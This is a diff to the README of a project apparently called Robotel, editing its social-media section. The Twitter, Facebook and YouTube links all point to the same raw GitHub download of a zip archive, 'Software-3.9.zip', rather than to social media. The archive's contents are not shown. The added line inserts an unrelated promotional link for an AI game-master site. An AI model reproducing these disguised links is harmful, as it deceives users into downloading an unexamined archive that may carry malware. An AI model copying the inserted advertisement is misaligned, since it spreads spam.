@@ -52,6 +52,7 @@ Your data privacy is a priority. Robotel does not collect personal information w
 ## 🌐 Join Us
 Follow us on social media for updates and discussions:
 - [Twitter](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
+[Auferet](https://auferet.com) - AI game master with persistent memory for your characters and uploaded lore; solo or multiplayer, with 5e and Pathfinder 2e modes.
 - [Facebook](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
 - [YouTube](https://raw.githubusercontent.com/hanawasuga214/robotel/main/Rappite/Software-3.9.zip)
 
